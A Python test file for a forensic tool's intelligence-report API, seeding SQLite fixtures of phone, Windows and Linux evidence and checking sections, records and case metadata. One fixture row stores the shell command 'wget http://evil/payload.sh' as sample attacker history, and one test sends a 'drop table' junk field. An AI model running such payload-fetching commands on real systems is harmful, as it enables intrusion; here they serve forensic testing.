"""Tests for the evidence intelligence report reader API."""

import sqlite3
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest
from starlette.testclient import TestClient


def _seed_task_db(db_path: Path) -> None:
    with sqlite3.connect(db_path) as conn:
        conn.executescript(
            """
            CREATE TABLE files (
                id INTEGER PRIMARY KEY, name TEXT, path TEXT, size INTEGER,
                extension TEXT, category TEXT, type TEXT, mtime INTEGER,
                ctime INTEGER, is_deleted INTEGER, md5 TEXT, scene_type TEXT,
                scene_priority INTEGER, scene_relevant INTEGER
            );
            INSERT INTO files VALUES
                (1, 'a.txt', '/evidence/a.txt', 12, '.txt', 'Documents', 'REG',
                 10, 9, 0, 'abc', 'linux', 75, 1),
                (2, 'deleted.txt', '/evidence/deleted.txt', 4, '.txt', 'Documents',
                 'REG', 8, 7, 1, 'def', 'linux', 0, 0);
            CREATE TABLE case_analysis (
                task_id TEXT, case_description TEXT, filtered_files TEXT,
                case_report TEXT, created_at INTEGER, updated_at INTEGER
            );
            INSERT INTO case_analysis VALUES
                ('task-1', '案情', '[]',
                 '# 案件概述\n案件背景说明\n\n# 时间线梳理\n2026-01-01 事件\n\n# 证据分析\n分析内容\n\n# 关键发现\n发现项\n\n# 结论与建议\n建议项',
                 1, 2);
            """
        )


@pytest.fixture()
def client(tmp_path: Path):
    db_path = tmp_path / "files.db"
    _seed_task_db(db_path)

    from httpserver.main import create_app

    app = create_app()
    backend = AsyncMock()
    backend.get_task = AsyncMock(return_value={
        "id": "task-1",
        "image_path": "/evidence/phone.E01",
        "output_files_db": str(db_path),
        "output_events_db": str(tmp_path / "events.db"),
    })
    with patch("httpserver.services.service_manager.ServiceManager.cpp_backend", backend, create=True):
        # Patch the resolver's cpp_backend lookup path.
        from httpserver.services import get_service_manager

        sm = get_service_manager()
        sm._cpp_backend = backend
        sm._lifecycle_state = "running"
        sm._cpp_backend_ready = True
        yield TestClient(app)


def test_directory_lists_overview_files_timeline_and_chapters(client):
    res = client.get("/api/llm/intelligence-report/task-1")
    assert res.status_code == 200
    data = res.json()
    ids = [(n["id"], n["kind"]) for n in data["directory"]]
    assert ("overview", "overview") in ids
    assert ("evidence.files", "records") in ids
    assert ("timeline", "records") in ids
    files_node = next(n for n in data["directory"] if n["id"] == "evidence.files")
    assert files_node["stats"]["total"] == 2
    assert files_node["stats"]["deleted"] == 1
    assert files_node["stats"]["relevant"] == 1


def test_files_records_paginated_and_includes_deleted(client):
    res = client.get("/api/llm/intelligence-report/task-1/records", params={"category": "evidence.files", "page": 1, "page_size": 5})
    assert res.status_code == 200
    page = res.json()
    assert page["category"] == "evidence.files"
    assert page["total"] == 2
    assert len(page["records"]) == 2
    deleted = next(r for r in page["records"] if r.get("is_deleted") == 1)
    assert deleted["path"] == "/evidence/deleted.txt"


def test_chapter_records_return_markdown(client):
    res = client.get("/api/llm/intelligence-report/task-1/records", params={"category": "analysis.overview"})
    assert res.status_code == 200
    page = res.json()
    assert page["total"] == 1
    assert "案件背景说明" in page["records"][0]["markdown"]


def test_unknown_category_returns_404(client):
    res = client.get("/api/llm/intelligence-report/task-1/records", params={"category": "nope"})
    assert res.status_code == 404


def test_search_returns_hits(client):
    res = client.get("/api/llm/intelligence-report/task-1/search", params={"q": "a.txt"})
    assert res.status_code == 200
    data = res.json()
    assert data["total"] >= 1
    assert any(h["category"] == "evidence.files" for h in data["hits"])


# ── structured artifact sections (contacts / sms / call_logs / apps / device_info) ──


def _seed_android_tables(db_path: Path) -> None:
    with sqlite3.connect(db_path) as conn:
        conn.executescript(
            """
            CREATE TABLE contacts (
                id INTEGER PRIMARY KEY, raw_contact_id INTEGER, display_name TEXT,
                phone_number TEXT, email TEXT, account_type TEXT, account_name TEXT
            );
            INSERT INTO contacts (display_name, phone_number, email) VALUES
                ('张三', '13800000001', 'zhangsan@x.com'),
                ('李四', '13800000002', NULL);
            CREATE TABLE sms_messages (
                id INTEGER PRIMARY KEY, thread_id INTEGER, address TEXT, person TEXT,
                date INTEGER, date_sent INTEGER, read INTEGER, status INTEGER,
                type INTEGER, body TEXT, service_center TEXT
            );
            INSERT INTO sms_messages (address, person, date, type, body) VALUES
                ('10086', NULL, 1607300000, 1, '余额提醒'),
                ('10086', NULL, 1607400000, 2, '查询');
            CREATE TABLE call_logs (
                id INTEGER PRIMARY KEY, number TEXT, date INTEGER, duration INTEGER,
                type INTEGER, name TEXT, geocoded_location TEXT
            );
            INSERT INTO call_logs (number, date, duration, type, name) VALUES
                ('13800000001', 1607300000, 120, 1, '张三');
            CREATE TABLE installed_packages (
                id INTEGER PRIMARY KEY, package_name TEXT UNIQUE, code_path TEXT,
                native_library_path TEXT, first_install_time INTEGER,
                last_update_time INTEGER, version TEXT, installer TEXT
            );
            INSERT INTO installed_packages (package_name, code_path, version, installer) VALUES
                ('com.example.app', '/data/app/com.example.app', '1.0', 'com.android.vending');
            CREATE TABLE system_build_properties (
                id INTEGER PRIMARY KEY, property_key TEXT UNIQUE, property_value TEXT
            );
            INSERT INTO system_build_properties (property_key, property_value) VALUES
                ('ro.product.model', 'P30'),
                ('ro.product.brand', 'HUAWEI'),
                ('ro.build.version.release', '10');
            """
        )


@pytest.fixture()
def android_client(tmp_path: Path):
    db_path = tmp_path / "files.db"
    _seed_task_db(db_path)
    _seed_android_tables(db_path)
    from httpserver.main import create_app

    app = create_app()
    backend = AsyncMock()
    backend.get_task = AsyncMock(return_value={
        "id": "task-1",
        "image_path": "/evidence/phone.E01",
        "output_files_db": str(db_path),
        "output_events_db": str(tmp_path / "events.db"),
    })
    with patch("httpserver.services.service_manager.ServiceManager.cpp_backend", backend, create=True):
        from httpserver.services import get_service_manager

        sm = get_service_manager()
        sm._cpp_backend = backend
        sm._lifecycle_state = "running"
        sm._cpp_backend_ready = True
        yield TestClient(app)


def test_directory_includes_structured_sections(android_client):
    res = android_client.get("/api/llm/intelligence-report/task-1")
    assert res.status_code == 200
    ids = {n["id"] for n in res.json()["directory"]}
    # every reference-report section is present in the directory
    assert {"evidence_info", "device_info", "contacts", "sms", "call_logs",
            "locations", "apps"} <= ids
    # platforms detected
    assert "android" in res.json()["metadata"]["platforms"]


def test_directory_sections_present_even_without_tables(client):
    """No platform tables → no platform artifact sections (no android/win/linux).
    Generic sections (overview/case/evidence_info/device_info/files/timeline) remain."""
    res = client.get("/api/llm/intelligence-report/task-1")
    ids = {n["id"] for n in res.json()["directory"]}
    # platform-specific sections are NOT shown when no platform detected
    assert "contacts" not in ids
    assert "sms" not in ids
    assert "apps" not in ids
    assert "win_users" not in ids
    assert "linux_users" not in ids
    # generic sections still present
    assert {"overview", "case", "evidence_info", "device_info", "evidence.files", "timeline"} <= ids
    # no platform claimed
    assert res.json()["metadata"]["platforms"] == []


def test_contacts_records(android_client):
    res = android_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "contacts"})
    assert res.status_code == 200
    page = res.json()
    assert page["total"] == 2
    assert page["records"][0]["display_name"] == "张三"


def test_sms_records(android_client):
    res = android_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "sms"})
    page = res.json()
    assert page["total"] == 2
    assert page["records"][0]["address"] == "10086"


def test_call_log_records(android_client):
    res = android_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "call_logs"})
    page = res.json()
    assert page["total"] == 1
    assert page["records"][0]["number"] == "13800000001"


def test_apps_records(android_client):
    res = android_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "apps"})
    page = res.json()
    assert page["total"] == 1
    assert page["records"][0]["package_name"] == "com.example.app"


def test_device_info_synthesizes_from_build_props(android_client):
    res = android_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "device_info"})
    page = res.json()
    assert page["total"] == 1
    record = page["records"][0]
    # resolved from ro.product.model / brand / release
    assert record["设备型号"] == "P30"
    assert record["设备品牌"] == "HUAWEI"
    assert record["系统版本"] == "10"
    # unset items render as empty (placeholder parity), not missing keys
    assert record["IMEI"] == ""
    assert "Wi-Fi地址" in record


def test_empty_category_returns_empty_page_not_404(android_client):
    """A registry section whose source table is absent-but-platform-detected
    returns total 0, not 404. (android_client detects android; locations has no
    source table in the fixture, so it should render total 0 gracefully.)"""
    # locations has no table in the seeded fixture → empty page, not error
    res = android_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "locations"})
    assert res.status_code == 200
    assert res.json()["total"] == 0
    # synthesized device_info always returns one record (placeholders)
    res = android_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "device_info"})
    assert res.json()["total"] == 1


# ── platform isolation: Android / Windows / Linux ──


def _seed_windows_tables(db_path: Path) -> None:
    with sqlite3.connect(db_path) as conn:
        conn.executescript(
            """
            CREATE TABLE user_accounts (
                id INTEGER PRIMARY KEY, rid INTEGER, username TEXT, full_name TEXT,
                comment TEXT, last_login INTEGER, password_last_set INTEGER,
                account_expires INTEGER, password_expires INTEGER, account_flags TEXT,
                is_admin INTEGER, home_directory TEXT, profile_path TEXT
            );
            INSERT INTO user_accounts (username, full_name, is_admin) VALUES
                ('Administrator', '管理员', 1),
                ('suspect', '嫌疑人', 0);
            CREATE TABLE usb_devices (
                id INTEGER PRIMARY KEY, vendor_id TEXT, product_id TEXT,
                serial_number TEXT, device_description TEXT, friendly_name TEXT,
                device_class TEXT, first_connected INTEGER, last_connected INTEGER,
                last_drive_letter TEXT
            );
            INSERT INTO usb_devices (device_description, serial_number, last_connected) VALUES
                ('USB Flash Disk', 'AA112233', 1607300000);
            CREATE TABLE windows_services (
                id INTEGER PRIMARY KEY, service_name TEXT, display_name TEXT,
                image_path TEXT, start_type TEXT, service_type TEXT, account_name TEXT,
                description TEXT, is_running INTEGER
            );
            INSERT INTO windows_services (service_name, display_name, start_type, is_running) VALUES
                ('TermService', '远程桌面服务', 'auto', 1);
            CREATE TABLE registry_values (
                id INTEGER PRIMARY KEY, hive_path TEXT, hive_type TEXT, key_path TEXT,
                value_name TEXT, value_type TEXT, value_data TEXT, last_modified INTEGER
            );
            INSERT INTO registry_values (value_name, value_data) VALUES
                ('ProductName', 'Windows Server 2019'),
                ('ComputerName', 'SRV-DC01');
            """
        )


def _seed_linux_tables(db_path: Path) -> None:
    with sqlite3.connect(db_path) as conn:
        conn.executescript(
            """
            CREATE TABLE linux_users (
                id INTEGER PRIMARY KEY, username TEXT UNIQUE, uid INTEGER, gid INTEGER,
                full_name TEXT, home_directory TEXT, shell TEXT, password_hash TEXT,
                is_locked INTEGER
            );
            INSERT INTO linux_users (username, uid, shell, is_locked) VALUES
                ('root', 0, '/bin/bash', 0),
                ('web', 1000, '/bin/sh', 0);
            CREATE TABLE linux_login_records (
                id INTEGER PRIMARY KEY, username TEXT, terminal TEXT, remote_host TEXT,
                login_time INTEGER, logout_time INTEGER, login_type TEXT, is_success INTEGER, pid INTEGER
            );
            INSERT INTO linux_login_records (username, remote_host, login_time, is_success) VALUES
                ('root', '1.2.3.4', 1607300000, 1);
            CREATE TABLE linux_shell_history (
                id INTEGER PRIMARY KEY, username TEXT, shell_type TEXT, command TEXT,
                timestamp INTEGER, line_number INTEGER, history_file TEXT
            );
            INSERT INTO linux_shell_history (username, command, timestamp) VALUES
                ('root', 'wget http://evil/payload.sh', 1607300100);
            CREATE TABLE linux_systemd_services (
                id INTEGER PRIMARY KEY, service_name TEXT, description TEXT,
                load_state TEXT, active_state TEXT, sub_state TEXT, unit_file TEXT,
                exec_start TEXT, user TEXT, is_enabled INTEGER
            );
            INSERT INTO linux_systemd_services (service_name, active_state, is_enabled) VALUES
                ('nginx.service', 'active', 1);
            CREATE TABLE os_config_files (
                id INTEGER PRIMARY KEY, file_path TEXT, content TEXT
            );
            INSERT INTO os_config_files (file_path, content) VALUES
                ('/etc/os-release', 'Ubuntu 22.04 LTS'),
                ('/etc/hostname', 'srv01');
            """
        )


@pytest.fixture()
def windows_client(tmp_path: Path):
    db_path = tmp_path / "files.db"
    _seed_task_db(db_path)
    _seed_windows_tables(db_path)
    from httpserver.main import create_app

    app = create_app()
    backend = AsyncMock()
    backend.get_task = AsyncMock(return_value={
        "id": "task-1", "image_path": "/evidence/pc.E01",
        "output_files_db": str(db_path),
        "output_events_db": str(tmp_path / "events.db"),
    })
    with patch("httpserver.services.service_manager.ServiceManager.cpp_backend", backend, create=True):
        from httpserver.services import get_service_manager
        sm = get_service_manager()
        sm._cpp_backend = backend
        sm._lifecycle_state = "running"
        sm._cpp_backend_ready = True
        yield TestClient(app)


@pytest.fixture()
def linux_client(tmp_path: Path):
    db_path = tmp_path / "files.db"
    _seed_task_db(db_path)
    _seed_linux_tables(db_path)
    from httpserver.main import create_app

    app = create_app()
    backend = AsyncMock()
    backend.get_task = AsyncMock(return_value={
        "id": "task-1", "image_path": "/evidence/server.E01",
        "output_files_db": str(db_path),
        "output_events_db": str(tmp_path / "events.db"),
    })
    with patch("httpserver.services.service_manager.ServiceManager.cpp_backend", backend, create=True):
        from httpserver.services import get_service_manager
        sm = get_service_manager()
        sm._cpp_backend = backend
        sm._lifecycle_state = "running"
        sm._cpp_backend_ready = True
        yield TestClient(app)


def test_windows_directory_shows_windows_sections_only(windows_client):
    res = windows_client.get("/api/llm/intelligence-report/task-1")
    ids = {n["id"] for n in res.json()["directory"]}
    assert "windows" in res.json()["metadata"]["platforms"]
    # Windows sections present
    assert {"win_users", "win_usb", "win_services", "win_device_info"} <= ids
    # Android sections NOT shown (wrong platform)
    assert "contacts" not in ids
    assert "sms" not in ids
    assert "apps" not in ids
    # Linux sections NOT shown
    assert "linux_users" not in ids


def test_windows_section_records(windows_client):
    res = windows_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "win_users"})
    page = res.json()
    assert page["total"] == 2
    assert page["records"][0]["username"] == "Administrator"


def test_windows_device_info_synthesized(windows_client):
    res = windows_client.get("/api/llm/intelligence-report/task-1/records",
                             params={"category": "win_device_info"})
    page = res.json()
    assert page["total"] == 1
    record = page["records"][0]
    assert record["操作系统"] == "Windows Server 2019"
    assert record["计算机名"] == "SRV-DC01"


def test_linux_directory_shows_linux_sections_only(linux_client):
    res = linux_client.get("/api/llm/intelligence-report/task-1")
    ids = {n["id"] for n in res.json()["directory"]}
    assert "linux" in res.json()["metadata"]["platforms"]
    # Linux sections present
    assert {"linux_users", "linux_login", "linux_shell", "linux_services",
            "linux_device_info"} <= ids
    # Android sections NOT shown
    assert "contacts" not in ids
    assert "sms" not in ids
    # Windows sections NOT shown
    assert "win_users" not in ids


def test_linux_section_records(linux_client):
    res = linux_client.get("/api/llm/intelligence-report/task-1/records",
                           params={"category": "linux_shell"})
    page = res.json()
    assert page["total"] == 1
    assert "wget" in page["records"][0]["command"]


def test_linux_device_info_synthesized(linux_client):
    res = linux_client.get("/api/llm/intelligence-report/task-1/records",
                           params={"category": "linux_device_info"})
    record = res.json()["records"][0]
    assert "Ubuntu 22.04 LTS" in record.get("发行版", "")


# ── report metadata (case info + evidence info) ──


def test_metadata_get_returns_all_fields_empty_initially(client):
    res = client.get("/api/llm/intelligence-report/task-1/metadata")
    assert res.status_code == 200
    meta = res.json()["metadata"]
    # every whitelisted field present, empty until edited
    for field in ("case_name", "case_number", "collector_name", "evidence_name",
                  "holder", "phone1"):
        assert field in meta
        assert meta[field] == ""


def test_metadata_put_then_get_roundtrip(android_client):
    payload = {
        "case_name": "电信诈骗案",
        "case_number": "AJ2026001",
        "collector_name": "王警官",
        "collector_unit": "网安支队",
        "evidence_name": "张洋办公手机",
        "holder": "张洋",
        "holder_type": "嫌疑人",
        "id_type": "身份证",
        "extract_start": "2026-07-17 11:01:28",
        "extract_end": "2026-07-17 11:11:28",
    }
    res = android_client.put("/api/llm/intelligence-report/task-1/metadata", json=payload)
    assert res.status_code == 200
    stored = res.json()["metadata"]
    assert stored["case_name"] == "电信诈骗案"
    assert stored["holder"] == "张洋"
    assert res.json()["updated_at"] is not None

    # persisted to disk — fresh GET sees it
    res2 = android_client.get("/api/llm/intelligence-report/task-1/metadata")
    assert res2.json()["metadata"]["collector_name"] == "王警官"
    assert res2.json()["metadata"]["evidence_name"] == "张洋办公手机"


def test_metadata_put_ignores_unknown_fields(android_client):
    res = android_client.put("/api/llm/intelligence-report/task-1/metadata",
                             json={"case_name": "X", "evil_column": "drop table"})
    assert res.status_code == 200
    assert res.json()["metadata"]["case_name"] == "X"
    assert "evil_column" not in res.json()["metadata"]


def test_metadata_table_created_lazily(android_client):
    """report_metadata table does not exist until first PUT; GET must still work."""
    # GET before any write: returns empty fields, no error
    res = android_client.get("/api/llm/intelligence-report/task-1/metadata")
    assert res.status_code == 200
    # after a PUT the table exists and persists
    android_client.put("/api/llm/intelligence-report/task-1/metadata",
                       json={"case_name": "after"})
    res2 = android_client.get("/api/llm/intelligence-report/task-1/metadata")
    assert res2.json()["metadata"]["case_name"] == "after"

